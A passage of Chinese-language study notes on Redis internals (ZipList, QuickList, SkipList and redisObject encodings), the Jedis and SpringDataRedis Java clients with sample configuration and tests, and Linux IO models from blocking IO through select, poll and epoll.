| `zlbytes`   | `uint32_t` | 4 字节 | 记录整个压缩列表占用的内存字节数。                           |
| `zltail`    | `uint32_t` | 4字节  | 记录压缩列表表尾节点距离压缩列表的起始地址有多少字节，通过这个偏移量，可以确定表尾节点的地址。 |
| `zllen`     | `uint16_t` | 2 字节 | 记录了压缩列表包含的节点数量。 最大值为`UINT16_MAX - 1` （65534），如果超过这个值，此处会记录为65535，但节点的真实数量需要遍历整个压缩列表才能计算得出。 |
| `entry`列表 | 列表节点   | 不定   | 压缩列表包含的各个节点，节点的长度由节点保存的内容决定。     |
| `zlend`     | `uint8_t`  | 1字节  | 特殊值`0xff`（十进制255），用于标记压缩列表的末端。          |

如果`ZipList`数据过多，导致链表过长，可能影响查询性能。

### `ZipListEntry`

`ZipList`中的`Entry`并不像普通链表那样记录前后节点的指针，因为记录两个指针要占用16个字节，浪费内存。而是采用了下面的结构：

- `previous_entry_length`：前一节点的长度，占1个或5个字节。
  - 如果前一节点的长度小于254字节，则采用1个字节来保存这个长度值。
  - 如果前一节点的长度大于等于254字节，则采用5个字节来保存这个长度值，第一个字节为`0xfe`，后四个字节才是真实长度数据。
- `encoding`：编码属性，记录`content`的数据类型（字符串还是整数）以及长度，占用1个、2个或5个字节。
- `contents`：负责保存节点的数据，可以是字符串或整数。

`ZipList`中所有存储长度的数值均采用小端字节序，即低位字节在前，高位字节在后。例如：数值`0x1234`，采用小端字节序后实际存储值为：`0x3412`。

`ZipListEntry`中的`encoding`编码分为字符串和整数两种：

- 如果`encoding`以`00`、`01`或者`10`开头，则表明`content`是字符串，它的编码如下：

  | **编码**                             | **编码长度** | **字符串大小**       |
  | ------------------------------------ | ------------ | -------------------- |
  | `00`加6个表示字符串大小的比特        | 1字节        | $\le63$字节          |
  | `01`加14个表示字符串大小的比特       | 2字节        | $\le16383$字节       |
  | `10000000`加32个表示字符串大小的比特 | 5字节        | $\le4294967295 $字节 |

- 如果`encoding`以`11`开始，则表明`content`是整数，且`encoding`固定只占用1个字节，它的编码如下：

  | 编码       | 编码长度 | 整数类型                                                     |
  | ---------- | -------- | ------------------------------------------------------------ |
  | `11000000` | 1字节    | `int16_t`                                                    |
  | `11010000` | 1字节    | `int32_t`                                                    |
  | `11100000` | 1字节    | `int64_t`                                                    |
  | `11110000` | 1字节    | 24位有符号整数                                               |
  | `11111110` | 1字节    | 8位有符号整数                                                |
  | `1111xxxx` | 1字节    | 直接在`xxxx`位置保存数值，范围从`0001`~`1101`，减1后结果为实际值 |

例如，假设`ZipList`中包含字符串`ab`与`bc`，则它的数据结构为：

| 十六进制表示 | 属性          |
| ------------ | ------------- |
| `13000000`   | `zlbytes`     |
| `0e000000`   | `zltail`      |
| `0200`       | `zllen`       |
| `00026162`   | `entry`：`ab` |
| `04026263`   | `entry`：`bc` |
| `ff`         | `zlend`       |

假设`ZipList`中包含整数`2`与`5`，则它的数据结构为：

| 十六进制表示 | 属性         |
| ------------ | ------------ |
| `0f000000`   | `zlbytes`    |
| `0c000000`   | `zltail`     |
| `0200`       | `zllen`      |
| `00f3`       | `entry`：`2` |
| `02f6`       | `entry`：`5` |
| `ff`         | `zlend`      |

### `ZipList`的连锁更新问题

`ZipList`的每个`Entry`都包含`previous_entry_length`来记录上一个节点的大小，长度是1个或5个字节：

- 如果前一节点的长度小于254字节，则采用1个字节来保存这个长度值。
- 如果前一节点的长度大于等于254字节，则采用5个字节来保存这个长度值，第一个字节为`0xfe`，后四个字节才是真实长度数据。

现在，假设有N个连续的、长度为250~253字节之间的`entry`，因此`entry`的`previous_entry_length`属性用1个字节即可表示。现在要在这些`entry`之前插入一个长度大于等于254字节的结点，则之后的所有结点的`previous_entry_length`属性都必须用5个字节表示，导致空间扩展。

`ZipList`这种特殊情况下产生的连续多次空间扩展操作称之为**连锁更新（Cascade Update）**。新增、删除都可能导致连锁更新的发生。连锁更新发生的概率较低。

## `QuickList`

`ZipList`虽然节省内存，但申请内存必须是连续空间，如果内存占用较多，申请内存效率很低。为了缓解这个问题，必须限制`ZipList`的长度和`entry`大小。如果要存储大量数据，超出了`ZipList`最佳的上限，则可以创建多个`ZipList`来分片存储数据。数据拆分后比较分散，不方便管理和查找，为了建立多个`ZipList`的联系，Redis在3.2版本引入了新的数据结构`QuickList`，它是一个双端链表，只不过链表中的每个节点都是一个`ZipList`。相关操作在quicklist.h与quicklist.c中。

为了避免`QuickList`中的每个`ZipList`中`entry`过多，Redis提供了一个配置项：`list-max-ziplist-size`来限制：

- 如果值为正，则表示`ZipList`的允许的`entry`个数的最大值。

- 如果值为负，则表示`ZipList`的最大内存大小，分5种情况：

  - -1：每个`ZipList`的内存占用不能超过4KB。
  - -2：每个`ZipList`的内存占用不能超过8KB。
  - -3：每个`ZipList`的内存占用不能超过16KB。
  - -4：每个`ZipList`的内存占用不能超过32KB。
  - -5：每个`ZipList`的内存占用不能超过64KB。

  默认值为-2。

  ```sh
  config get list-max-ziplist-size  # 获取list-max-ziplist-size
  config set list-max-ziplist-size -2  # 设置list-max-ziplist-size，也可以在配置文件中配置
  ```

除了控制`ZipList`的大小，`QuickList`还可以对节点的`ZipList`做压缩。通过配置项`list-compress-depth`来控制。因为链表一般都是从首尾访问较多，所以首尾是不压缩的。这个参数是控制首尾不压缩的节点个数：

- 0：特殊值，代表不压缩。

- $n$：表示`QuickList`的首尾各有$n$个节点不压缩，中间节点压缩。

  默认值为0。

  ```sh
  config get list-compress-depth  # 获取list-compress-depth
  config set list-compress-depth 0  # 设置list-compress-depth，也可以在配置文件中配置
  ```

`QuickList`与`QuickListNode`的定义如下：

```c
typedef struct quicklist {
    // 头节点指针
    quicklistNode *head; 
    // 尾节点指针
    quicklistNode *tail; 
    // 所有ziplist的entry的数量
    unsigned long count;    
    // ziplists总数量
    unsigned long len;
    // ziplist的entry上限，默认值 -2 
    int fill : QL_FILL_BITS;
    // 首尾不压缩的节点数量
    unsigned int compress : QL_COMP_BITS;
    // 内存重分配时的书签数量及数组，一般用不到
    unsigned int bookmark_count: QL_BM_BITS;
    quicklistBookmark bookmarks[];
} quicklist;
```

```c
typedef struct quicklistNode {
    // 前一个节点指针
    struct quicklistNode *prev;
    // 下一个节点指针
    struct quicklistNode *next;
    // 当前节点的ZipList指针
    unsigned char *zl;
    // 当前节点的ZipList的字节大小
    unsigned int sz;
    // 当前节点的ZipList的entry个数
    unsigned int count : 16;  
    // 编码方式：1，ZipList; 2，lzf压缩模式
    unsigned int encoding : 2;
    // 数据容器类型（预留）：1，其它；2，ZipList
    unsigned int container : 2;
    // 是否被解压缩。1：则说明被解压了，将来要重新压缩
    unsigned int recompress : 1;
    unsigned int attempted_compress : 1;  // 测试用
    unsigned int extra : 10;  // 预留字段
} quicklistNode;
```

## `SkipList`

`SkipList`（跳表）首先是链表，但与传统链表相比有几点差异：

- 元素按照升序排列存储。
- 节点可能包含多个指针，指针跨度不同。

数据结构如下：

```c
// 定义在server.h头文件中
typedef struct zskiplist {
    struct zskiplistNode *header, *tail;  // 头尾节点指针
    unsigned long length;  // 节点数量
    int level;  // 最大的索引层级，默认是1
} zskiplist;
```

```c
// 定义在server.h头文件中
typedef struct zskiplistNode {
    sds ele;  // 节点存储的值
    double score;  // 节点分数，排序、查找用
    struct zskiplistNode *backward;  // 前一个节点指针
    struct zskiplistLevel {
        struct zskiplistNode *forward;  // 下一个节点指针
        unsigned long span;  // 索引跨度
    } level[];  // 多级索引数组
} zskiplistNode;
```

`SkipList`的特点：

- `SkipList`是一个双向链表，每个节点都包含`score`和`ele`值。
- 节点按照`score`值排序，`score`值一样则按照`ele`字典排序。
- 每个节点都可以包含多层指针，层数是1到32之间的随机数。
- 不同层指针到下一个节点的跨度不同，层级越高，跨度越大。
- 增删改查效率与红黑树基本一致，实现却更简单。

## `redisObject`

Redis中的任意数据类型的键和值都会被封装为一个`redisObject`，也叫做Redis对象，定义如下：

```c
// 定义在server.h头文件中
typedef struct redisObject {  // 占用16个字节
    unsigned type:4;  // 对象类型，分别是string、hash、list、set与zset，占4个bit
    unsigned encoding:4;  // 底层编码方式，共有11种，占4个bit位
    unsigned lru:LRU_BITS;  // lru表示该对象最后一次被访问的时间，占用24个bit位，便于判断空闲时间太久的键
    int refcount;  // 对象引用计数器，计数器为0则说明对象无人引用，可以被回收
    void *ptr;  // 指针，指向存放实际数据的空间
} robj;
```

五种对象类型的定义如下：

```c
// 定义在server.h头文件中
#define OBJ_STRING 0
#define OBJ_LIST 1
#define OBJ_SET 2
#define OBJ_ZSET 3
#define OBJ_HASH 4
```

### Redis的编码方式

Redis中会根据存储的数据类型不同，选择不同的编码方式，共包含11种不同类型：

| 编号 | 编码方式                  | 说明                                     |
| ---- | ------------------------- | ---------------------------------------- |
| 0    | `OBJ_ENCODING_RAW`        | `raw`编码动态字符串（SDS的一种编码方式） |
| 1    | `OBJ_ENCODING_INT`        | `long`类型的整数的字符串                 |
| 2    | `OBJ_ENCODING_HT`         | 哈希表（字典`dict`）                     |
| 3    | `OBJ_ENCODING_ZIPMAP`     | 已废弃                                   |
| 4    | `OBJ_ENCODING_LINKEDLIST` | 双端链表                                 |
| 5    | `OBJ_ENCODING_ZIPLIST`    | 压缩列表                                 |
| 6    | `OBJ_ENCODING_INTSET`     | 整数集合                                 |
| 7    | `OBJ_ENCODING_SKIPLIST`   | 跳表                                     |
| 8    | `OBJ_ENCODING_EMBSTR`     | `embstr`的动态字符串                     |
| 9    | `OBJ_ENCODING_QUICKLIST`  | 快速列表                                 |
| 10   | `OBJ_ENCODING_STREAM`     | `Stream`流                               |

每种数据类型的使用的编码方式如下：

| 数据类型     | 编码方式                                                   |
| ------------ | ---------------------------------------------------------- |
| `OBJ_STRING` | `int`、`embstr`、`raw`                                     |
| `OBJ_LIST`   | `LinkedList`和`ZipList`（3.2以前）、`QuickList`（3.2以后） |
| `OBJ_SET`    | `intset`、`HT`                                             |
| `OBJ_ZSET`   | `ZipList`、`HT`、`SkipList`                                |
| `OBJ_HASH`   | `ZipList`、`HT`                                            |

可以通过`object encoding [键]`查看`[键]`的编码格式。

# Redis的Java客户端

在Redis官网中提供了各种语言的[客户端](https://redis.io/clients)。部分Java客户端如下：

| 客户端                                  | 说明                                                         |
| --------------------------------------- | ------------------------------------------------------------ |
| [Jedis](https://github.com/redis/jedis) | 以Redis命令作为方法名称，学习成本低，简单实用。但是Jedis实例是线程不安全的，多线程环境下需要基于连接池来使用。 |
| lettuce                                 | lettuce是基于Netty实现的，支持同步、异步和响应式编程方式，并且是线程安全的。支持Redis的哨兵模式、集群模式和管道模式。是Spring官方默认兼容的客户端。 |
| Redisson                                | Redisson是一个基于Redis实现的分布式、可伸缩的Java数据结构集合。包含了诸如`Map`、`Queue`、`Lock`、`Semaphore`、`AtomicLong`等强大功能。 |

## Jedis

创建Maven工程，引入依赖：

```xml
<dependency>
    <groupId>redis.clients</groupId>
    <artifactId>jedis</artifactId>
    <version>4.2.0</version>
</dependency>
<dependency>
    <groupId>org.junit.jupiter</groupId>
    <artifactId>junit-jupiter</artifactId>
    <version>5.8.2</version>
</dependency>
```

测试：

```java
package com.example.redis.jedis;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import redis.clients.jedis.Jedis;

import java.util.Map;

public class JedisTest {

    private Jedis jedis;

    // 创建Jedis对象，建立连接
    @BeforeEach
    public void setUp() {
        jedis = new Jedis("192.168.242.142", 6379);
        jedis.auth("123456");
        jedis.select(0);
    }

    // 使用Jedis，方法名与Redis命令一致
    @Test
    public void testSaveString() {
        String result = jedis.set("name", "Alice");
        System.out.println("result = " + result);
        String name = jedis.get("name");
        System.out.println("name = " + name);
    }

    @Test
    public void testHash() {
        jedis.hset("user:1", "name", "Bob");
        jedis.hset("user:1", "age", "21");
        Map<String, String> map = jedis.hgetAll("user:1");
        System.out.println(map);
    }

    // 释放资源
    @AfterEach
    public void tearDown() {
        if (jedis != null) {
            jedis.close();
        }
    }

}
```

Jedis本身是线程不安全的，因此并发环境下Jedis需要给每个线程创建独立的Jedis对象，但是频繁创建和销毁连接会有性能损耗，因此推荐使用Jedis连接池代替Jedis的直连方式。

```java
package com.example.redis.jedis.util;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPool;
import redis.clients.jedis.JedisPoolConfig;

import java.time.Duration;

public class JedisConnectionFactory {

    private static final JedisPool jedisPool;

    static {
        // 配置连接池
        JedisPoolConfig poolConfig = new JedisPoolConfig();
        // 最多连接
        poolConfig.setMaxTotal(8);
        // 最多空闲连接
        poolConfig.setMaxIdle(8);
        // 最少空闲连接
        poolConfig.setMinIdle(0);
        // 最长等待时间（ms）
        poolConfig.setMaxWait(Duration.ofMillis(1000));
        // 创建连接池对象
        jedisPool = new JedisPool(poolConfig, "192.168.242.142", 6379, 1000, "123456");
    }

    public static Jedis getJedis() {
        return jedisPool.getResource();
    }

}
```

下面修改测试：

```java
// ...
import com.example.redis.util.JedisConnectionFactory;
// ...

@BeforeEach
public void setUp() {
    jedis = JedisConnectionFactory.getJedis();
}
```

此时`jedis.close()`会归还连接到连接池。

## SpringDataRedis

SpringData是Spring中数据操作的模块，包含对各种数据库的集成，其中对Redis的集成模块就叫做[SpringDataRedis](https://spring.io/projects/spring-data-redis)，它：

- 提供了对不同Redis客户端的整合（Lettuce和Jedis）。
- 提供了`RedisTemplate`统一API来操作Redis（底层实现可以使用Lettuce、Jedis等）。
- 支持Redis的发布订阅模型。
- 支持Redis哨兵和Redis集群。
- 支持基于Lettuce的响应式编程。
- 支持基于JDK、JSON、字符串、Spring对象的数据序列化及反序列化。
- 支持基于Redis的JDKCollection实现（基于Redis的实现是分布式的、跨系统的）。

SpringDataRedis中提供了`RedisTemplate`工具类，其中封装了各种对Redis的操作。并且将不同数据类型的操作封装到了不同的API中：

| API                           | 返回值类型        | 说明                                            |
| ----------------------------- | ----------------- | ----------------------------------------------- |
| `redisTemplate.opsForValue()` | `ValueOperations` | 操作`String`类型数据                            |
| `redisTemplate.opsForHash()`  | `HashOperations`  | 操作`Hash`类型数据（操作类似Java中的`HashMap`） |
| `redisTemplate.opsForList()`  | `ListOperations ` | 操作`List`类型数据                              |
| `redisTemplate.opsForSet()`   | `SetOperations`   | 操作`Set`类型数据                               |
| `redisTemplate.opsForZSet()`  | `ZSetOperations`  | 操作`SortedSet`类型数据                         |
| `redisTemplate`               |                   | 通用的命令                                      |

SpringBoot已经提供了对SpringDataRedis的支持，使用非常简单。

创建SpringBoot项目，引入依赖：

```xml
<!-- Redis依赖 -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-redis</artifactId>
</dependency>
<!-- 连接池依赖，不管是Jedis还是lettuce，底层都会基于commons-pool实现连接池效果 -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-pool2</artifactId>
</dependency>
```

创建配置文件src/main/resources/application.yml：

```yml
spring:
  redis:
    host: 192.168.242.142
    port: 6379
    password: 123456
    lettuce:  # 选择实现，如果选择Jedis，则需要引入Jedis相关依赖，因为SpringBoot默认使用lettuce
      pool:  # 手动配置lettuce的连接池，如果不配置则连接池不生效
        max-active: 8  # 最大连接
        max-idle: 8  # 最大空闲连接
        min-idle: 0  # 最小空闲连接
        max-wait: 100ms  # 连接等待时间
```

注入`RedisTemplate`并编写测试：

```java
package com.example.redis.spring;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.data.redis.core.RedisTemplate;

@SpringBootTest
public class SpringDataRedisTest {

    @Autowired
    private RedisTemplate<String, String> redisTemplate;

    @Test
    public void testSaveString() {
        redisTemplate.opsForValue().set("name", "Alice");
        String name = redisTemplate.opsForValue().get("name");
        System.out.println("name = " + name);
    }

}
```

### SpringDataRedis的序列化方式

`RedisTemplate`可以接收任意`Object`作为值写入Redis，只不过写入前会把`Object`序列化为字节形式，默认是采用JDK序列化。因此如果以上`RedisTemplate`未指定泛型参数，得到的键为`\xAC\xED\x00\x05t\x00\x04name`，值为`\xAC\xED\x00\x05t\x00\x05Alice`。它的缺点在于可读性差，且内存占用较大。

下面自定义`RedisTemplate`的序列化方式。

引入依赖：

```xml
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
</dependency>
```

自定义`RedisTemplate`的序列化方式：

```java
package com.example.redis.spring.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;
import org.springframework.data.redis.serializer.RedisSerializer;

@Configuration
public class RedisConfig {

    @Bean
    public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory connectionFactory) {
        // 创建RedisTemplate对象
        RedisTemplate<String, Object> template = new RedisTemplate<>();
        // 设置连接工厂
        template.setConnectionFactory(connectionFactory);
        // 创建JSON序列化工具
        GenericJackson2JsonRedisSerializer jsonRedisSerializer = new GenericJackson2JsonRedisSerializer();
        // 设置键的序列化
        template.setKeySerializer(RedisSerializer.string());
        template.setHashKeySerializer(RedisSerializer.string());
        // 设置值的序列化
        template.setValueSerializer(jsonRedisSerializer);
        template.setHashValueSerializer(jsonRedisSerializer);
        // 返回
        return template;
    }

}
```

测试：

```java
package com.example.redis.spring;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.data.redis.core.RedisTemplate;

@SpringBootTest
public class SpringDataRedisTest {

    @Autowired
    private RedisTemplate<String, Object> redisTemplate;

    @Test
    public void testSaveString() {
        redisTemplate.opsForValue().set("name", "Alice");
        Object name = redisTemplate.opsForValue().get("name");
        System.out.println("name = " + name);
    }

}
```

对象也能被序列化。

引入依赖：

```xml
<dependency>
    <groupId>org.projectlombok</groupId>
    <artifactId>lombok</artifactId>
    <version>1.18.24</version>
</dependency>
```

创建实体类：

```java
package com.example.redis.spring.pojo;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@NoArgsConstructor
@AllArgsConstructor
public class User {
    
    private String name;
    
    private int age;
    
}
```

测试：

```java
import com.example.redis.spring.pojo.User;

@Test
public void testSaveUser() {
    redisTemplate.opsForValue().set("user:100", new User("Alice", 21));
    System.out.println(redisTemplate.opsForValue().get("user:100"));
}
```

对象被转为JSON并写入Redis。

当获取结果时，通过JSON的`@class`属性可以获取类的字节码，并将JSON反序列化为`User`对象。

### `StringRedisTemplate`

`@class`属性会带来额外的内存开销。为了节省内存空间，我们并不会使用JSON序列化器来处理值，而是统一使用`String`序列化器，要求只能存储`String`类型的键值。当需要存储Java对象时，手动完成对象的序列化和反序列化。

Spring默认提供了一个`StringRedisTemplate`类，它的键值的序列化方式默认就是`String`方式。省去了自定义`RedisTemplate`的过程：

```java
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.data.redis.core.StringRedisTemplate;

@Autowired
private StringRedisTemplate stringRedisTemplate;

private static final ObjectMapper mapper = new ObjectMapper();

@Test
public void testSaveStringByStringRedisTemplate() {
    stringRedisTemplate.opsForValue().set("name", "Alice");
    Object name = stringRedisTemplate.opsForValue().get("name");
    System.out.println("name = " + name);
}

@Test
public void testSaveUserByStringRedisTemplate() throws JsonProcessingException {
    // 创建对象并手动序列化，存入Redis
    User user = new User("Alice", 21);
    String json = mapper.writeValueAsString(user);
    stringRedisTemplate.opsForValue().set("user:100", json);
    // 读取数据并手动反序列化
    String result = stringRedisTemplate.opsForValue().get("user:100");
    System.out.println(mapper.readValue(result, User.class));
}
```

此时存入的JSON将没有`@class`属性。

# Redis网络模型

## 用户空间和内核空间

服务器大多都采用Linux系统，这里我们以Linux为例来讲解。

任何Linux发行版，其系统内核都是Linux。我们的应用都需要通过Linux内核与硬件交互。用户应用基于Linux发行版访问内核，然后基于内核操作计算机硬件。

计算机硬件包括CPU、RAM、网路适配器等，内核在设备驱动器的基础上对内存、虚拟文件系统、进程、网络栈等管理。用户应用与共享库通过封装的系统调用接口访问这些信息，从而间接地实现对硬件设备的访问。

为了避免用户应用导致冲突甚至内核崩溃，用户应用与内核是分离的：

- 进程的寻址空间（虚拟地址）会划分为两部分：**内核空间**、**用户空间**。
- 用户空间只能执行受限的命令（Ring3），而且不能直接调用系统资源，必须通过内核提供的接口来访问。
- 内核空间可以执行特权命令（Ring0），调用一切系统资源。

进程执行过程中可能需要执行特权命令，因此可能在用户空间与内核空间之间切换。当进程运行在用户空间，则称其位于用户态；当进程运行在内核空间，则称其位于内核态。

例如，Linux系统为了提高IO效率，会在用户空间和内核空间都加入缓冲区：

- 写数据时，要把用户缓冲数据拷贝到内核缓冲区，然后写入设备。
- 读数据时，要从设备读取数据到内核缓冲区，然后拷贝到用户缓冲区。

## 阻塞IO

在《UNIX网络编程》一书中，总结归纳了5种IO模型：

- 阻塞IO（Blocking IO）
- 非阻塞IO（Nonblocking IO）
- IO多路复用（IO Multiplexing）
- 信号驱动IO（Signal Driven IO）
- 异步IO（Asynchronous IO）

顾名思义，阻塞IO就是两个阶段都必须阻塞等待：

- 阶段一：

  - 用户进程调用内核命令`recvfrom`，尝试读取数据（比如网卡数据）。
  - 此时数据尚未到达，内核需要等待数据。
  - 此时用户进程也处于阻塞状态。
- 阶段二：

  - 数据到达并拷贝到内核缓冲区，代表已就绪。
  - 将内核数据拷贝到用户缓冲区。
  - 拷贝过程中，用户进程依然阻塞等待。
  - 拷贝完成，用户进程解除阻塞，处理数据。

可以看到，阻塞IO模型中，用户进程在两个阶段都是阻塞状态。

## 非阻塞IO

顾名思义，非阻塞IO的`recvfrom`操作会立即返回结果而不是阻塞用户进程。

阶段一：

- 用户进程尝试读取数据（比如网卡数据）。
- 此时数据尚未到达，内核需要等待数据。
- 返回异常给用户进程。
- 用户进程拿到error后，再次尝试读取。
- 循环往复，直到数据就绪。

阶段二：

- 将内核数据拷贝到用户缓冲区。
- 拷贝过程中，用户进程依然阻塞等待。
- 拷贝完成，用户进程解除阻塞，处理数据。

可以看到，非阻塞IO模型中，用户进程在第一个阶段是非阻塞，第二个阶段是阻塞状态。虽然是非阻塞，但性能并没有得到提高。而且忙等机制会导致CPU空转，CPU使用率暴增。

## IO多路复用

无论是阻塞IO还是非阻塞IO，用户应用在一阶段都需要调用`recvfrom`来获取数据，差别在于无数据时的处理方案：

- 如果调用`recvfrom`时，恰好没有数据，阻塞IO会使CPU阻塞，非阻塞IO使CPU空转，都不能充分发挥CPU的作用。
- 如果调用`recvfrom`时，恰好有数据，则用户进程可以直接进入第二阶段，读取并处理数据。

而在单线程情况下，只能依次处理IO事件，如果正在处理的IO事件恰好未就绪（数据不可读或不可写），线程就会被阻塞，所有IO事件都必须等待，性能自然会很差。

就比如服务员给顾客点餐，分两步：

- 顾客思考要吃什么（等待数据就绪）。
- 顾客想好了，开始点餐（读取数据）。

要提高效率，至少有两种方法：

- 方案一：增加更多服务员（多线程），但是开销大（需要上下文切换等开销）。
- 方案二：不排队，谁想好了吃什么（数据就绪了），服务员就给谁点餐（用户应用就去读取数据）。

用户进程通过**IO多路复用**知道内核中数据是否就绪。IO多路复用利用单个线程来同时监听多个**文件描述符（File Descriptor，FD）**，并在某个FD可读、可写时得到通知，从而避免无效的等待，充分利用CPU资源。

文件描述符是一个从0 开始的无符号整数，用来关联Linux中的一个文件。在Linux中，一切皆文件，例如常规文件、视频、硬件设备等，当然也包括网络套接字（Socket）。

IO多路复用的两阶段如下：

- 阶段一：

  - 用户进程调用`select`，指定要监听的FD集合。
  - 内核监听FD对应的多个socket。
  - 任意一个或多个socket数据就绪则返回`readable`。
  - 此过程中用户进程阻塞。
- 阶段二：

  - 用户进程找到就绪的socket。
  - 依次调用`recvfrom`读取数据。
  - 内核将数据拷贝到用户空间。
  - 用户进程处理数据。

IO多路复用是利用单个线程来同时监听多个FD，并在某个FD可读、可写时得到通知，从而避免无效的等待，充分利用CPU资源。不过监听FD的方式、通知的方式又有多种实现，常见的有：`select`、`poll`与`epoll`。

它们的差异在于：

- `select`和`poll`只会通知用户进程有FD就绪，但不确定具体是哪个FD，需要用户进程逐个遍历FD来确认。
- `epoll`则会在通知用户进程FD就绪的同时，把已就绪的FD写入用户空间。

### `select`

`select`是Linux中最早的I/O多路复用实现方案：

```c
// 定义类型别名 __fd_mask，本质是 long int
typedef long int __fd_mask;

/* fd_set 记录要监听的fd集合，及其对应状态 */
typedef struct {
    // fds_bits是long类型数组，长度为 1024/32 = 32
    // 共1024个bit位，每个bit位代表一个fd，0代表未就绪，1代表就绪
    __fd_mask fds_bits[__FD_SETSIZE / __NFDBITS];
    // ...
} fd_set;

// select函数，用于监听fd_set，也就是多个fd的集合
int select(
    int nfds,  // 要监视的fd_set的最大fd + 1（遍历上限）
    fd_set *readfds,  // 要监听读事件的fd集合
    fd_set *writefds,  // 要监听写事件的fd集合
    fd_set *exceptfds,  // 要监听异常事件的fd集合
    struct timeval *timeout  // 超时时间，null：永不超时；0：不阻塞等待；大于0：固定等待时间
);
```

一次`select`操作过程如下：

1. 用户进程创建`fd_set rfds`（假设监听读事件）。
2. 假如要监听`fd = 1, 2, 5`，则`readfds`为`00010011`（为了简化，假设`fd_set`只有8位，且最后一位对应`fd=1`）。
3. 执行`select(5 + 1, rfds, null, null, 3)`。
4. 将`rfds`集合传递到内核空间（执行用户态到内核态的切换）。
5. 内核遍历`fd_set`，找到就绪的`fd`，处理数据。如果没有就绪的`fd`，则休眠，等待数据就绪被唤醒或超时。
6. 将结果写入`fd_set`：保留就绪的`fd`，复位未就绪的`fd`；`select`返回一个值，告诉用户就绪的`fd`的数量；将`fd_set`拷贝到用户空间，覆盖用户空间的`fd_set`。
7. 用户进程遍历`fd_set`，找到就绪的`fd`，处理数据。如果要再次执行`select`，则进入步骤2。

`select`模式存在的问题：

- 需要将整个`fd_set`从用户空间拷贝到内核空间，`select`结束还要再次拷贝回用户空间。
- `select`无法得知具体是哪个fd就绪，需要遍历整个`fd_set`。
- `fd_set`监听的fd数量不能超过1024。

### `poll`

poll模式对select模式做了简单改进，但性能提升不明显，部分关键代码如下：

```c
// pollfd中的（部分）事件类型
#define POLLIN  // 可读事件
#define POLLOUT  // 可写事件
#define POLLERR  // 错误事件
#define POLLNVAL  // fd未打开

// pollfd结构
struct pollfd {
    int fd;  // 要监听的fd 
    short int events;  // 要监听的事件类型：读、写、异常
    short int revents;  // 实际发生的事件类型，创建该结构时无需指定；内核监听过程中，如果发现事件就绪，则将就绪事件的类型放到revents中；如果超时，没有就绪，则将其设置为0
};

// poll函数
int poll(
    struct pollfd *fds,  // pollfd数组，可以自定义大小
    nfds_t nfds,  // 数组元素个数
    int timeout  // 超时时间
);
```

IO流程：

- 创建`pollfd`数组，向其中添加关注的fd信息，数组大小自定义。
- 调用`poll`函数，将`pollfd`数组拷贝到内核空间，转链表存储，无上限。
- 内核遍历fd，判断是否就绪。
- 数据就绪或超时后，拷贝`pollfd`数组到用户空间，返回就绪fd数量$n$。
- 用户进程判断$n$是否大于0。
- 大于0则遍历`pollfd`数组，找到就绪的fd。

与`select`对比：

- `select`模式中的`fd_set`大小固定为1024，而`pollfd`在内核中采用链表，理论上无上限。
- 监听FD越多，每次遍历消耗时间也越久，性能反而会下降。

### `epoll`

`epoll`模式是对`select`与`poll`的改进，它提供了三个函数：

```c
struct eventpoll {
    //...
    struct rb_root rbr;  // 一颗红黑树，记录要监听的FD
    struct list_head rdlist;  // 一个链表，记录就绪的FD
    //...
};

// 在内核创建eventpoll结构体，返回对应的句柄epfd
int epoll_create(int size);

// 将一个FD添加到epoll的红黑树中，并设置ep_poll_callback
// callback触发时，就把对应的FD加入到rdlist这个就绪列表中
int epoll_ctl(
    int epfd,  // epoll实例的句柄
    int op,  // 要执行的操作，包括：ADD、MOD、DEL
    int fd,  // 要监听的FD
    struct epoll_event *event  // 要监听的事件类型：读、写、异常等
);

// 检查rdlist列表是否为空，不为空则返回就绪的FD的数量
int epoll_wait(
    int epfd,  // epoll实例的句柄
    struct epoll_event *events,  // 空event数组，用于接收就绪的FD
    int maxevents,  // events数组的最大长度
    int timeout  // 超时时间，-1表示永不超时；0表示不阻塞；大于0表示阻塞时间
);
```

[^0]: “将一个FD添加到epoll的红黑树中”：表述不太正确。

用户进程依次调用`epoll_create`、`epoll_ctl`与`epoll_wait`函数，完成一次`epoll`过程。调用`epoll_wait`函数后，内核检查`eventpoll.list_head`是否为空，如果不为空，或在超时时间内有FD就绪（此时`list_head`不为空），则将`list_head`中的元素拷贝到（用户空间的）`events`中（在这之前会将所有FD从`list_head`中断开）。

`epoll`模式的优点在于：

- 由于每个FD只需要执行一次`epoll_ctl`添加到红黑树，以后每次`epoll_wait`无需传递任何参数，无需重复拷贝FD到内核空间，且内核只需将就绪FD拷贝给用户空间，因此大大减少拷贝次数与数量。本质上它将`select`函数的功能分为两部分，将执行频率较高的`epoch_wait`与执行频率较低的`epoll_ctl`拆分。

- 利用`ep_poll_callback`机制来监听FD状态，无需遍历所有FD，因此性能不会随监听的FD数量增多而下降。用户进程不用遍历所有FD找到就绪的FD，因为`events`接收的一定是就绪的FD。

- 基于`epoll`实例中的红黑树保存要监听的FD，使其支持的FD理论上无上限，且增删改查效率高（`poll`采用的链表设计效率低）。

### 事件通知机制

当FD有数据可读时，调用`epoll_wait`（或者`select`、`poll`）可以得到通知。但是事件通知的模式有两种：

- LevelTriggered：简称LT。当FD有数据可读时，会重复通知多次，直至数据处理完成。是`Epoll`的默认模式。
- EdgeTriggered：简称ET，当FD有数据可读时，只会被通知一次，不管数据是否处理完成。

